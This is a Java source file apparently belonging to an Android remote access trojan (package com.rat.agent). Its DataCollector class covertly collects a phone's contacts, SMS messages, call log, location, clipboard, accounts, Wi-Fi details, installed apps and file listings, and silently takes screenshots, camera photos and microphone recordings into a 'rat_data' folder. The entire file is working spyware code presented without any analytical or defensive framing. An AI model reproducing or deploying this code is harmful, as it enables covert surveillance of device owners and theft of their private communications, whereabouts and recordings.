package com.rat.agent;

import android.content.Context;
import android.content.ContentResolver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Environment;
import android.net.Uri;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class DataCollector {

    private final Context ctx;

    public DataCollector(Context ctx) {
        this.ctx = ctx;
    }

    public String collectContacts() throws Exception {
        JSONArray contacts = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                }, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                JSONObject c = new JSONObject();
                c.put("name", cursor.getString(0));
                c.put("number", cursor.getString(1));
                c.put("type", cursor.getInt(2));
                contacts.put(c);
            }
            cursor.close();
        }
        return contacts.toString();
    }

    public String collectSms() throws Exception {
        JSONArray sms = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date", "type", "read"},
                null, null, "date DESC LIMIT 500");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                JSONObject s = new JSONObject();
                s.put("address", cursor.getString(0));
                s.put("body", cursor.getString(1));
                s.put("date", cursor.getLong(2));
                s.put("type", cursor.getInt(3));
                s.put("read", cursor.getInt(4));
                sms.put(s);
            }
            cursor.close();
        }
        return sms.toString();
    }

    public String collectCallLog() throws Exception {
        JSONArray calls = new JSONArray();
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                new String[]{"number", "type", "date", "duration", "cached_name"},
                null, null, "date DESC LIMIT 500");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                JSONObject c = new JSONObject();
                c.put("number", cursor.getString(0));
                c.put("type", cursor.getInt(1));
                c.put("date", cursor.getLong(2));
                c.put("duration", cursor.getLong(3));
                c.put("name", cursor.getString(4));
                calls.put(c);
            }
            cursor.close();
        }
        return calls.toString();
    }

    public String collectLocation() throws Exception {
        JSONObject loc = new JSONObject();
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                Location gps = null;
                Location net = null;
                try { gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Exception ignored) {}
                try { net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) {}
                Location best = null;
                if (gps != null && net != null) {
                    best = gps.getTime() > net.getTime() ? gps : net;
                } else {
                    best = gps != null ? gps : net;
                }
                if (best != null) {
                    loc.put("latitude", best.getLatitude());
                    loc.put("longitude", best.getLongitude());
                    loc.put("altitude", best.getAltitude());
                    loc.put("accuracy", best.getAccuracy());
                    loc.put("speed", best.getSpeed());
                    loc.put("bearing", best.getBearing());
                    loc.put("time", best.getTime());
                    loc.put("provider", best.getProvider());
                }
            }
        } catch (Exception e) {
            loc.put("error", e.getMessage());
        }
        return loc.toString();
    }

    public String collectDeviceInfo() throws Exception {
        return DeviceUtils.getDeviceInfo(ctx).toString();
    }

    public String collectAppList() throws Exception {
        JSONArray apps = new JSONArray();
        PackageManager pm = ctx.getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        for (PackageInfo pi : packages) {
            JSONObject app = new JSONObject();
            app.put("package", pi.packageName);
            app.put("version", pi.versionName);
            app.put("version_code", pi.versionCode);
            app.put("install_time", pi.firstInstallTime);
            app.put("update_time", pi.lastUpdateTime);
            app.put("target_sdk", pi.applicationInfo.targetSdkVersion);
            app.put("min_sdk", pi.applicationInfo.minSdkVersion);
            boolean isSystem = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            app.put("is_system", isSystem);
            apps.put(app);
        }
        return apps.toString();
    }

    public String captureScreenshot() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= 30) {
                return "{\"error\":\"screen capture requires MediaProjection on API 30+\"}";
            }
            File dir = new File(ctx.getCacheDir(), "rat_data");
            dir.mkdirs();
            String filename = "screen_" + System.currentTimeMillis() + ".png";
            File outFile = new File(dir, filename);
            Process p = Runtime.getRuntime().exec(new String[]{"screencap", "-p", outFile.getAbsolutePath()});
            p.waitFor();
            if (outFile.exists()) {
                JSONObject result = new JSONObject();
                result.put("file", outFile.getAbsolutePath());
                result.put("size", outFile.length());
                result.put("type", "screenshot");
                return result.toString();
            }
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put("error", e.getMessage());
                return err.toString();
            } catch (Exception ex) {
                return "{\"error\":\"screenshot failed\"}";
            }
        }
        return "{\"error\":\"screenshot failed\"}";
    }

    public String capturePhoto() {
        try {
            File dir = new File(ctx.getCacheDir(), "rat_data");
            dir.mkdirs();
            String filename = "photo_" + System.currentTimeMillis() + ".jpg";
            File outFile = new File(dir, filename);

            final boolean[] done = {false};
            final String[] result = {null};

            Camera.PictureCallback callback = new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        FileOutputStream fos = new FileOutputStream(outFile);
                        fos.write(data);
                        fos.close();
                        camera.release();
                        JSONObject r = new JSONObject();
                        r.put("file", outFile.getAbsolutePath());
                        r.put("size", outFile.length());
                        r.put("type", "photo");
                        result[0] = r.toString();
                    } catch (Exception e) {
                        try {
                            JSONObject r = new JSONObject();
                            r.put("error", e.getMessage());
                            result[0] = r.toString();
                        } catch (Exception ex) {}
                    }
                    done[0] = true;
                }
            };

            Camera cam = Camera.open(0);
            cam.setPreviewCallback(null);
            cam.takePicture(null, null, callback);

            long start = System.currentTimeMillis();
            while (!done[0] && System.currentTimeMillis() - start < 10000) {
                Thread.sleep(100);
            }
            if (!done[0]) {
                cam.release();
                return "{\"error\":\"camera timeout\"}";
            }
            return result[0] != null ? result[0] : "{\"error\":\"camera failed\"}";
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put("error", e.getMessage());
                return err.toString();
            } catch (Exception ex) {
                return "{\"error\":\"camera failed\"}";
            }
        }
    }

    public String recordAudio(int durationSec) {
        try {
            File dir = new File(ctx.getCacheDir(), "rat_data");
            dir.mkdirs();
            String filename = "audio_" + System.currentTimeMillis() + ".3gp";
            File outFile = new File(dir, filename);

            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Thread.sleep(durationSec * 1000L);

            recorder.stop();
            recorder.release();

            JSONObject result = new JSONObject();
            result.put("file", outFile.getAbsolutePath());
            result.put("size", outFile.length());
            result.put("duration", durationSec);
            result.put("type", "audio");
            return result.toString();
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put("error", e.getMessage());
                return err.toString();
            } catch (Exception ex) {
                return "{\"error\":\"audio recording failed\"}";
            }
        }
    }

    public String collectClipboard() {
        try {
            android.content.ClipboardManager cm =
                (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null) {
                        JSONObject result = new JSONObject();
                        result.put("clipboard", text.toString());
                        return result.toString();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "{\"clipboard\":\"\"}";
    }

    public String collectAccounts() throws Exception {
        JSONArray accounts = new JSONArray();
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(ctx);
            android.accounts.Account[] accts = am.getAccounts();
            for (android.accounts.Account a : accts) {
                JSONObject acc = new JSONObject();
                acc.put("name", a.name);
                acc.put("type", a.type);
                accounts.put(acc);
            }
        } catch (Exception ignored) {}
        return accounts.toString();
    }

    public String collectWifiInfo() throws Exception {
        JSONObject info = new JSONObject();
        try {
            android.net.wifi.WifiManager wm =
                (android.net.wifi.WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                android.net.wifi.WifiInfo winfo = wm.getConnectionInfo();
                info.put("ssid", winfo.getSSID());
                info.put("bssid", winfo.getBSSID());
                info.put("rssi", winfo.getRssi());
                info.put("link_speed", winfo.getLinkSpeed());
                info.put("ip_address", winfo.getIpAddress());
            } else {
                info.put("wifi_enabled", false);
            }
        } catch (Exception e) {
            info.put("error", e.getMessage());
        }
        return info.toString();
    }

    public String collectFiles(String path) throws Exception {
        JSONArray files = new JSONArray();
        File dir = (path != null && !path.isEmpty()) ? new File(path) : Environment.getExternalStorageDirectory();
        if (dir.exists() && dir.isDirectory()) {
            File[] listing = dir.listFiles();
            if (listing != null) {
                int count = 0;
                for (File f : listing) {
                    if (count >= 200) break;
                    JSONObject fj = new JSONObject();
                    fj.put("name", f.getName());
                    fj.put("path", f.getAbsolutePath());
                    fj.put("is_dir", f.isDirectory());
                    fj.put("length", f.length());
                    fj.put("last_modified", f.lastModified());
                    files.put(fj);
                    count++;
                }
            }
        }
        return files.toString();
    }
}
